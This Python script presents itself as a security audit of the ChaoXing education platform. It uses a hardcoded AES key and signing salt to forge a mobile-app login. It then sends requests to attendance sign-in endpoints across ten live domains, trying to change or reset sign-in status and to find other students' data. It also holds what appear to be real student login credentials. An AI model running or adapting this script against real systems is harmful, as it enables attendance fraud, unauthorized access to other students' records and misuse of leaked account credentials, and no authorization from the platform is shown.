#!/usr/bin/env python3
"""Tier 4 Domain Exploration - ChaoXing Learning/Teaching Core Domains Security Audit"""

import base64, hashlib, json, uuid, requests, urllib3, time, sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

# ============================================================
# Domains
# ============================================================
DOMAINS = [
    "learn.chaoxing.com",
    "mobilelearn.chaoxing.com",
    "mooc1.chaoxing.com",
    "mooc1-2.chaoxing.com",
    "mooc1-3.chaoxing.com",
    "mooc.chaoxing.com",
    "i.mooc.chaoxing.com",
    "pc.chaoxing.com",
    "m.chaoxing.com",
    "i.chaoxing.com",
]

COMMON_SIGN_PATHS = [
    "/pptSign/updateSignStatus",
    "/pptSign/updateSignStatusByUidsV2",
    "/pptSign/refeashSignList4Json2",
    "/pptSign/stuSignajax",
    "/pptSign/signedResult",
    "/pptSign/resetUserSignStatus",
    "/newsign/updateSignStatus",
    "/newsign/preSign",
    "/widget/sign/pcTeaSignController/updateSignStatus2",
    "/widget/sign/pcTeaSignController/getSignCode",
    "/v2/apis/sign/signIn",
    "/v2/apis/sign/updateSignStatus",
    "/v2/apis/sign/refreshQRCode",
    "/sign/updateSignStatus",
    "/sign/stuSignajax",
    "/api/sign/updateSignStatus",
    "/mooc-ans/pptSign/updateSignStatusByUidsV2",
    "/mooc-ans/pptSign/refeashSignList4Json2",
    "/mooc-ans/newsign/updateSignStatus",
]

SIGN_KEYWORDS = ["sign", "签到", "signtype", "signid", "activeid", "signstatus", "signlist", "signinfo", "attendance"]

def get_sign_params(uid):
    return {
        "activeId": "5000163891319",
        "uid": uid,
        "courseId": "257485372",
        "classId": "132821141",
        "signType": "0",
        "clientType": "1",
    }

def contains_sign_keywords(text):
    text_lower = text.lower()
    found = [k for k in SIGN_KEYWORDS if k in text_lower]
    return found

def is_critical_response(text, path):
    """Check if response indicates student can modify sign-in status"""
    text_lower = text.lower()
    modify_paths = ["updateSignStatus", "updateSignStatusByUidsV2", "resetUserSignStatus",
                    "updateSignStatus2", "stuSignajax", "signIn"]
    is_modify = any(m in path for m in modify_paths)
    if not is_modify:
        return False
    # Check for success indicators
    try:
        data = json.loads(text)
        result = str(data.get("result", data.get("status", data.get("code", ""))))
        msg = str(data.get("msg", data.get("message", data.get("info", "")))).lower()
        if result in ("1", "true", "200", "0") and any(k in msg or k in text_lower for k in ["sign", "签到", "success", "成功"]):
            return True
        if result == "1" and "sign" in text_lower:
            return True
    except:
        pass
    return False

def test_domain(domain, session, uid):
    results = {
        "domain": domain,
        "https_alive": False,
        "http_alive": False,
        "found_endpoints": [],
        "critical_endpoints": [],
        "interesting_findings": [],
        "details": []
    }

    # Test base URL accessibility
    for scheme in ["https", "http"]:
        base_url = f"{scheme}://{domain}"
        try:
            r = session.get(base_url, timeout=15, allow_redirects=True, verify=False)
            alive_key = f"{scheme}_alive"
            if r.status_code < 500:
                results[alive_key] = True
                results["details"].append(f"[BASE] {base_url} -> {r.status_code}, len={len(r.text)}")
                kw = contains_sign_keywords(r.text[:2000])
                if kw:
                    results["interesting_findings"].append(f"Base URL {base_url} contains keywords: {kw}")
            else:
                results[alive_key] = False
                results["details"].append(f"[BASE] {base_url} -> {r.status_code}")
        except Exception as e:
            results["details"].append(f"[BASE] {base_url} -> ERROR: {type(e).__name__}: {str(e)[:100]}")

    # Test sign paths
    sign_params = get_sign_params(uid)
    for path in COMMON_SIGN_PATHS:
        for scheme in ["https", "http"]:
            url = f"{scheme}://{domain}{path}"
            for method in ["GET", "POST"]:
                try:
                    if method == "GET":
                        r = session.get(url, params=sign_params, timeout=15, allow_redirects=False, verify=False)
                    else:
                        r = session.post(url, data=sign_params, timeout=15, allow_redirects=False, verify=False)

                    status = r.status_code
                    body = r.text[:3000] if r.text else ""

                    if status == 404:
                        continue

                    kw = contains_sign_keywords(body)
                    entry = f"[{method}] {url} -> {status}, len={len(r.text)}, keywords={kw}"
                    results["details"].append(entry)

                    if status < 500 and status != 404:
                        ep_info = {
                            "url": url,
                            "method": method,
                            "status": status,
                            "keywords": kw,
                            "body_preview": body[:500]
                        }
                        results["found_endpoints"].append(ep_info)

                        # Check critical
                        if is_critical_response(body, path):
                            results["critical_endpoints"].append(ep_info)
                            results["details"].append(f"  *** CRITICAL: Student can modify sign status via {method} {url} ***")

                        # Interesting findings
                        if kw:
                            # Check for other students' data
                            try:
                                data = json.loads(body)
                                data_str = json.dumps(data)
                                if "uid" in data_str and uid not in data_str:
                                    results["interesting_findings"].append(
                                        f"Possible other-student data at {method} {url}: contains uid different from logged-in user"
                                    )
                            except:
                                pass

                            # Check for sign details
                            if any(k in ["签到", "signstatus", "signlist", "signinfo", "attendance"] for k in kw):
                                results["interesting_findings"].append(
                                    f"Sign detail data at {method} {url}: keywords={kw}, preview={body[:200]}"
                                )

                except Exception as e:
                    err_str = f"{type(e).__name__}: {str(e)[:80]}"
                    # Only log non-timeout connection errors briefly
                    if "timeout" not in err_str.lower() and "connection" not in err_str.lower():
                        results["details"].append(f"[{method}] {url} -> ERROR: {err_str}")

    return results


def main():
    print("=" * 80)
    print("Tier 4 Domain Exploration - ChaoXing Learning/Teaching Core Domains")
    print("=" * 80)

    # Login as student
    print("\n[*] Logging in as student...")
    stu_session, stu_puid = login("18436633997", "3.1415926Cpy")
    print(f"    Student PUID: {stu_puid}")
    if not stu_puid:
        print("    WARNING: Student login may have failed (no PUID found)")

    uid = stu_puid or "431407443"

    all_results = []

    for domain in DOMAINS:
        print(f"\n{'='*60}")
        print(f"[*] Testing domain: {domain}")
        print(f"{'='*60}")
        result = test_domain(domain, stu_session, uid)
        all_results.append(result)

        alive = "YES" if (result["https_alive"] or result["http_alive"]) else "NO"
        print(f"  Alive: {alive} (HTTPS={result['https_alive']}, HTTP={result['http_alive']})")
        print(f"  Found endpoints: {len(result['found_endpoints'])}")
        print(f"  Critical endpoints: {len(result['critical_endpoints'])}")
        if result["interesting_findings"]:
            print(f"  Interesting findings:")
            for f in result["interesting_findings"]:
                print(f"    - {f}")
        if result["critical_endpoints"]:
            print(f"  *** CRITICAL ENDPOINTS ***")
            for ep in result["critical_endpoints"]:
                print(f"    - {ep['method']} {ep['url']} -> {ep['status']}")
                print(f"      Body: {ep['body_preview'][:200]}")

    # Summary
    print("\n" + "=" * 80)
    print("SUMMARY")
    print("=" * 80)

    for r in all_results:
        alive = "YES" if (r["https_alive"] or r["http_alive"]) else "NO"
        print(f"\n--- {r['domain']} ---")
        print(f"  Alive: {alive}")
        print(f"  Found endpoints: {len(r['found_endpoints'])}")
        if r["found_endpoints"]:
            for ep in r["found_endpoints"]:
                print(f"    - [{ep['method']}] {ep['url']} -> {ep['status']} keywords={ep['keywords']}")
        print(f"  Critical endpoints: {len(r['critical_endpoints'])}")
        if r["critical_endpoints"]:
            for ep in r["critical_endpoints"]:
                print(f"    - [{ep['method']}] {ep['url']} -> {ep['status']} BODY={ep['body_preview'][:300]}")
        if r["interesting_findings"]:
            print(f"  Interesting findings:")
            for f in r["interesting_findings"]:
                print(f"    - {f}")

    # Detailed log
    print("\n" + "=" * 80)
    print("DETAILED LOG")
    print("=" * 80)
    for r in all_results:
        print(f"\n--- {r['domain']} ---")
        for d in r["details"]:
            print(f"  {d}")

    # Save JSON results
    with open("/workspace/tier4_results.json", "w", encoding="utf-8") as f:
        json.dump(all_results, f, ensure_ascii=False, indent=2, default=str)
    print(f"\n[*] Results saved to /workspace/tier4_results.json")


if __name__ == "__main__":
    main()
